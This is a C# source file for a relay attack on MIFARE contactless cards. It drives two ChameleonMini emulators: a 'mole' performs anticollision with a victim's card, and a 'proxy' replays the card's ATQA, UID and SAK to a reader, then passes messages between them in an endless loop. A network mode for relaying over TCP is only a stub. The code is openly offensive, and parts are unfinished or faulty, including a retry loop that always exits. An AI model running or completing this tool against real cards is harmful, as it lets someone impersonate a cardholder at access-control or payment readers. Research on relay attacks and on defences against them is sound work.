using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.IO;
using MifareModules;
using System.Net;
using System.Net.Sockets;

namespace ChameleonProxy
{
    class Program
    {
        const int bytesize = 1024 * 1024;
        static void Main(string[] args)
        {
            // nastavit parametry
            ProgramArguments pArgs = new ProgramArguments(args);
            int waitTime = pArgs.MoleWaitTime;
            int proxyWaitTime = pArgs.ProxyWaitTime;

            if (pArgs.SimpleAttack)
            {
                SimpleProxyAttack(waitTime, proxyWaitTime, pArgs.MoleComName, pArgs.ProxyComName);
            }

            else if (pArgs.Proxy)
            {
                NetworkAttackProxy(pArgs);
            }
            else if (pArgs.Mole)
            {
                NetworkAttackMole(pArgs);
            }

        }

        private static void NetworkAttackProxy(ProgramArguments pArgs)
        {
            SerialModuleConfig chameleon2config = new SerialModuleConfig()
            {
                PortName = pArgs.ProxyComName,
            };
            SerialModule serial2 = new SerialModule(chameleon2config)
            {
                Verbose = false,
            };
            ChameleonModule proxy = new ChameleonModule(serial2)
            {
                Verbose = true,
            };
            Console.WriteLine("** Chameleon Connected  via {0} **", pArgs.ProxyComName);

            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(pArgs.MoleIp), int.Parse(pArgs.MolePort));
            TcpClient client = new TcpClient(ep);
            Console.WriteLine("** Client connected to {0}:{1}", ep.Address, ep.Port);
        }

        private static void NetworkAttackMole(ProgramArguments pArgs)
        {
            SerialModuleConfig chameleon1Config = new SerialModuleConfig()
            {
                PortName = pArgs.MoleComName,
            };

            SerialModule serial1 = new SerialModule(chameleon1Config)
            {
                Verbose = false,
            };

            ChameleonModule mole = new ChameleonModule(serial1)
            {
                Verbose = true,
            };
            CardModule cardMole = new CardModule(mole) { Verbose = true };
            Console.WriteLine("** Chameleon Connected  via {0} **", pArgs.MoleComName);


            TcpListener listener = new TcpListener(IPAddress.Any, int.Parse(pArgs.MolePort));
            listener.Start();
            Console.WriteLine("** Server Listening for requests at {0}:{1} **\nWaiting for proxy connection...", pArgs.MoleIp, pArgs.MolePort);

            listener.AcceptTcpClient();
            Console.WriteLine("Proxy connected!");
            Console.ReadLine();



        }

        private static void SimpleProxyAttack(int moleWaitTime, int proxyWaitTime, string molePort = "COM3", string proxyPort = "COM4")
        {
            // initialize chameleons
            SerialModuleConfig chameleon1Config = new SerialModuleConfig()
            {
                PortName = molePort,

            };
            SerialModule serial1 = new SerialModule(chameleon1Config)
            {
                Verbose = false,
            };

            ChameleonModule mole = new ChameleonModule(serial1)
            {
                Verbose = true,
            };
            CardModule cardMole = new CardModule(mole) { Verbose = true };
            Console.WriteLine("** Chameleon Connected  via {0} **", molePort);

            SerialModuleConfig chameleon2config = new SerialModuleConfig()
            {
                PortName = proxyPort,
            };
            SerialModule serial2 = new SerialModule(chameleon2config)
            {
                Verbose = false,
            };
            ChameleonModule proxy = new ChameleonModule(serial2)
            {
                Verbose = true,
            };
            Console.WriteLine("** Chameleon Connected  via {0} **", proxyPort);

            bool anticolisionPassed = false;
            string Atqa = "";
            string uid = "";
            string sak = "";
            string answer = "";

            while (!anticolisionPassed)
            {
                try
                {
                    // anticolise mole to card
                    Atqa = cardMole.ReqA();
                    Sleep(moleWaitTime);
                    uid = cardMole.Select();
                    Sleep(moleWaitTime);
                    sak = cardMole.SelectUid(uid);
                }
                catch (NoDataException)
                {
                    
                }
                anticolisionPassed = true;
            }
            Console.WriteLine("*** anticollision on mole passed ***");
            anticolisionPassed = false;
            while (!anticolisionPassed)
            {
                //anticolise proxy to reader
                try
                {
                    //hope this will work
                    //assuming reqA has been sent
                    proxy.Send(Atqa);
                    Sleep(proxyWaitTime);
                    proxy.Send(uid);
                    Sleep(proxyWaitTime);
                    answer = proxy.SendWithAnswer(sak);
                    Sleep(proxyWaitTime);
                    anticolisionPassed = true;
                }
                catch(NoDataException)
                {
anticolisionPassed = false;
                }
            }
            Console.WriteLine("*** anticollision on Proxy passed ***");
            while (true)
            {
                //actual proxying
                answer = mole.SendWithAnswer(answer);
                answer = proxy.SendWithAnswer(answer);
                Sleep(proxyWaitTime);

            }

            Console.ReadLine();

        }

        private static void Sleep(int ms)
        {
            if (ms > 0)
            {
                Thread.Sleep(ms);
            }
        }
    }

    class ProgramArguments
    {
        public bool SimpleAttack = true;
        public bool Mole = false;
        public bool Proxy = false;
        public string MoleIp = "127.0.0.1";
        public string MolePort = "54321";
        public string MoleComName = "COM3";
        public string ProxyComName = "COM4";
        public int MoleWaitTime = 2;
        public int ProxyWaitTime = 0;

        public ProgramArguments(string[] args)
        {
            if (args.Contains("-s"))
            {
                SimpleAttack = true;
                Mole = false;
                Proxy = false;

                if (args.Contains("--mcom"))
                {
                    MoleComName = args[Array.IndexOf(args, "--mcom") + 1];
                }
                if (args.Contains("--pcom"))
                {
                    ProxyComName = args[Array.IndexOf(args, "--pcom") + 1];
                }

                if (args.Contains("-p") || args.Contains("-m"))
                {
                    PrintHelp();
                }
            }
            if (args.Contains("-m"))
            {
                SimpleAttack = false;
                Mole = true;
                Proxy = false;

                if (args.Contains("--mport"))
                {
                    MolePort = args[Array.IndexOf(args, "--mport") + 1];
                }
                if (args.Contains("--mip"))
                {
                    MoleIp = args[Array.IndexOf(args, "--mip") + 1];
                }
                if (args.Contains("--mcom"))
                {
                    MoleComName = args[Array.IndexOf(args, "--mcom") + 1];
                }
                if (args.Contains("-p") || args.Contains("-s"))
                {
                    PrintHelp();
                }
            }

            if (args.Contains("-p"))
            {
                SimpleAttack = false;
                Mole = false;
                Proxy = true;

                if (args.Contains("--mport"))
                {
                    MolePort = args[Array.IndexOf(args, "--mport") + 1];
                }

                if (args.Contains("--mip"))
                {
                    MoleIp = args[Array.IndexOf(args, "--mip") + 1];
                }
                if (args.Contains("--pcom"))
                {
                    ProxyComName = args[Array.IndexOf(args, "--pcom") + 1];
                }
                if (args.Contains("-m") || args.Contains("-s"))
                {
                    PrintHelp();
                }
            }

            if (args.Contains("-w"))
            {
                MoleWaitTime = int.Parse(args[Array.IndexOf(args, "-w") + 1]);
            }
            if (args.Contains("-r"))
            {
                ProxyWaitTime = int.Parse(args[Array.IndexOf(args, "-r") + 1]);
            }

            if (args.Contains("-h") || args.Contains("--help"))
            {
                PrintHelp();
            }
        }

        public static void PrintHelp()
        {
            Console.WriteLine("this is help ...");
            Environment.Exit(0);
        }
    }
}
